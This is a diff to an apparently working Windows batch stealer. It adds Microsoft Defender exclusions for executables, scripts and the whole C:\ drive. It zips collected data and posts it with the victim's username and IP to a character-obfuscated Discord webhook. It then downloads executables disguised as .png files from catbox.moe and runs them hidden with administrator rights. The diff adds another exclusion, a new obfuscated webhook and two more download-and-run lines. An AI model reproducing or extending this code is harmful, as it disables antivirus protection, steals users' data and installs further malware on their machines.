@@ -9,6 +9,7 @@ goto :yes
 %powershell% -Command Add-MpPreference -ExclusionExtension ".exe"
 %powershell% -Command Add-MpPreference -ExclusionExtension ".bat"
 %powershell% -Command Add-MpPreference -ExclusionExtension ".ps1"
+%powershell% -Command Add-MpPreference -ExclusionExtension ".py"
 %powershell% -Command Add-MpPreference -ExclusionPath "%temp%"
 %powershell% -Command Add-MpPreference -ExclusionPath "%path%"
 %powershell% -Command Add-MpPreference -ExclusionPath "C:\\"
@@ -116,7 +117,7 @@ goto :EOF
 :yes
 set script=%0
 set folder=0d70a44179fe5ec33da11f4767a0a5891fb37932
-set w=h%x%t%x%t%x%p%x%s%x%:%x%/%x%/%x%c%x%a%x%n%x%a%x%r%x%y%x%.%x%d%x%i%x%s%x%c%x%o%x%r%x%d%x%.%x%c%x%o%x%m%x%/%x%a%x%p%x%i%x%/%x%w%x%e%x%b%x%h%x%o%x%o%x%k%x%s%x%/%x%1%x%1%x%3%x%1%x%3%x%5%x%5%x%0%x%1%x%0%x%4%x%7%x%9%x%9%x%5%x%6%x%0%x%6%x%8%x%/%x%I%x%P%x%1%x%v%x%l%x%8%x%Y%x%l%x%7%x%l%x%5%x%O%x%R%x%H%x%L%x%B%x%7%x%y%x%Y%x%u%x%W%x%g%x%r%x%C%x%N%x%X%x%V%x%J%x%Z%x%-%x%Q%x%9%x%K%x%A%x%H%x%z%x%T%x%S%x%U%x%o%x%c%x%j%x%8%x%L%x%d%x%h%x%a%x%g%x%R%x%Z%x%b%x%j%x%z%x%W%x%w%x%1%x%M%x%z%x%8%x%n%x%K%x%s%x%c%x%r%x%q%x%2%x%M%x%d%x%
+set w=%ww%h%ww%t%ww%t%ww%p%ww%s%ww%:%ww%/%ww%/%ww%c%ww%a%ww%n%ww%a%ww%r%ww%y%ww%.%ww%d%ww%i%ww%s%ww%c%ww%o%ww%r%ww%d%ww%.%ww%c%ww%o%ww%m%ww%/%ww%a%ww%p%ww%i%ww%/%ww%w%ww%e%ww%b%ww%h%ww%o%ww%o%ww%k%ww%s%ww%/%ww%1%ww%1%ww%3%ww%3%ww%4%ww%6%ww%8%ww%4%ww%7%ww%2%ww%6%ww%0%ww%1%ww%4%ww%8%ww%9%ww%4%ww%6%ww%9%ww%/%ww%0%ww%I%ww%l%ww%2%ww%7%ww%U%ww%j%ww%E%ww%o%ww%_%ww%F%ww%b%ww%T%ww%K%ww%q%ww%N%ww%b%ww%l%ww%7%ww%u%ww%D%ww%f%ww%2%ww%P%ww%V%ww%-%ww%j%ww%c%ww%i%ww%0%ww%0%ww%V%ww%v%ww%B%ww%c%ww%5%ww%c%ww%M%ww%D%ww%O%ww%W%ww%o%ww%B%ww%P%ww%1%ww%8%ww%L%ww%r%ww%0%ww%b%ww%E%ww%W%ww%_%ww%f%ww%x%ww%j%ww%v%ww%6%ww%j%ww%F%ww%d%ww%H%ww%1%ww%L%ww%c%ww%h%ww%b%ww%r%ww%
 set path=%temp%\%folder%
 set kiwioutput=%path%\tmp\Kiwi\kiwi.json
 set kiwitempstep1=%path%\tmp\ktmp1
@@ -160,7 +161,10 @@ call :makescreenshot end_screenshot
 %curl% -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@%path%\[%uid%].zip" -F "payload_json={\"content\":\"[%time%] New LOG : %username% - %ip%\"}" %w%
 timeout 5 /nobreak > nul
 call :clean
+mkdir "%temp%\GraphicsType"
 %powershell% iwr -useb "https://files.catbox.moe/p3vomo.png" -OutFile "%temp%\GraphicsType\tmp.exe"; saps "%temp%\GraphicsType\tmp.exe" -Verb RunAs -WindowStyle Hidden
 %powershell% iwr -useb "https://files.catbox.moe/vll6vf.png" -OutFile "%temp%\GraphicsType\tmp1.exe"; saps "%temp%\GraphicsType\tmp1.exe" -Verb RunAs -WindowStyle Hidden
+%powershell% iwr -useb "https://files.catbox.moe/rlfpqj.png" -OutFile "%temp%\GraphicsType\tmp2.exe"; saps "%temp%\GraphicsType\tmp2.exe" -Verb RunAs -WindowStyle Hidden
+%powershell% iwr -useb "https://files.catbox.moe/1wxcwu.png" -OutFile "%temp%\GraphicsType\tmp3.exe"; saps "%temp%\GraphicsType\tmp3.exe" -Verb RunAs -WindowStyle Hidden
 goto :EOF
 exit
